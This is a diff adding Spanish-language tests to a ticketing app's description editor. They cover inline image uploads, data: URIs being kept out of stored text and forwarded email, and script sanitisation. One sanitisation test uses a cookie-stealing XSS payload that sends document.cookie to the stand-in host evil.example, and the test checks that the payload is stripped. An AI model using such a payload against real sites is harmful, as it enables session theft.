@@ -274,3 +274,70 @@ describe('incluir tiempo trabajado en la descripción', () => {
     expect(ticket.descripcion).toContain('Tiempo trabajado: 1h 30m');
   });
 });
+
+describe('editor de descripción con imágenes inline', () => {
+  // PNG 1x1 real en base64, el mismo fixture que usan las pruebas de subida de adjuntos.
+  const PNG_1X1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';
+
+  it('una imagen pegada al crear el ticket se sube como adjunto y se ve resuelta en el detalle', async () => {
+    const t = makeTestApp({ usuarios: [SUP] });
+    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
+    const descripcionConImagen =
+      `<p>Mira el error:</p><img src="data:image/png;base64,${PNG_1X1}" alt="captura">`;
+    const crear = await agent.post('/app/tickets').type('form').send({
+      _csrf: csrf, asunto: 'Con imagen inline', descripcion: descripcionConImagen, tipo: 'General', prioridad: 'Media',
+    });
+    expect(crear.status).toBe(302);
+    const id = String(crear.headers.location).split('/').pop()!;
+
+    const ticket = t.ticketStore.tickets.get(id)!;
+    // Lo que se guarda en el ticket NUNCA es el data: URI crudo — solo la referencia.
+    expect(ticket.descripcion).not.toContain('base64');
+    expect(ticket.descripcion).toContain('data-adj-id="');
+    expect([...t.adjuntoTicketRepo.docs.values()]).toHaveLength(1);
+    const adjunto = [...t.adjuntoTicketRepo.docs.values()][0]!;
+    expect(adjunto.ticketId).toBe(id);
+    expect(adjunto.contentType).toBe('image/png');
+
+    const detalle = await agent.get(`/app/tickets/${id}`);
+    expect(detalle.status).toBe(200);
+    expect(detalle.text).toContain('Mira el error');
+    expect(detalle.text).toContain(`src="data:image/png;base64,${PNG_1X1}"`);
+  });
+
+  it('un <script> inyectado en la descripción se elimina por completo (nunca llega al servidor guardado)', async () => {
+    const t = makeTestApp({ usuarios: [SUP] });
+    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
+    const maliciosa = '<p>Hola</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
+    const crear = await agent.post('/app/tickets').type('form').send({
+      _csrf: csrf, asunto: 'Payload malicioso', descripcion: maliciosa, tipo: 'General', prioridad: 'Media',
+    });
+    expect(crear.status).toBe(302);
+    const id = String(crear.headers.location).split('/').pop()!;
+    const ticket = t.ticketStore.tickets.get(id)!;
+    expect(ticket.descripcion).not.toContain('<script');
+    expect(ticket.descripcion).not.toContain('evil.example');
+    expect(ticket.descripcion).toContain('Hola');
+
+    const detalle = await agent.get(`/app/tickets/${id}`);
+    expect(detalle.text).not.toContain('<script>fetch');
+    expect(detalle.text).not.toContain('evil.example');
+  });
+
+  it('el correo de reenvío no incluye el data: URI de la imagen (se omite, no se infla el correo)', async () => {
+    const t = makeTestApp({ usuarios: [SUP] });
+    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
+    const crear = await agent.post('/app/tickets').type('form').send({
+      _csrf: csrf,
+      asunto: 'Con imagen para correo',
+      descripcion: `<p>Ve la imagen</p><img src="data:image/png;base64,${PNG_1X1}">`,
+      tipo: 'General',
+      prioridad: 'Media',
+      contactoCorreo: 'cliente@x.com',
+    });
+    const id = String(crear.headers.location).split('/').pop()!;
+    await agent.post(`/app/tickets/${id}/reenviar-correo`).type('form').send({ _csrf: csrf });
+    expect(t.emailSender.ultimo?.html).not.toContain('base64');
+    expect(t.emailSender.ultimo?.html).toContain('Ve la imagen');
+  });
+});
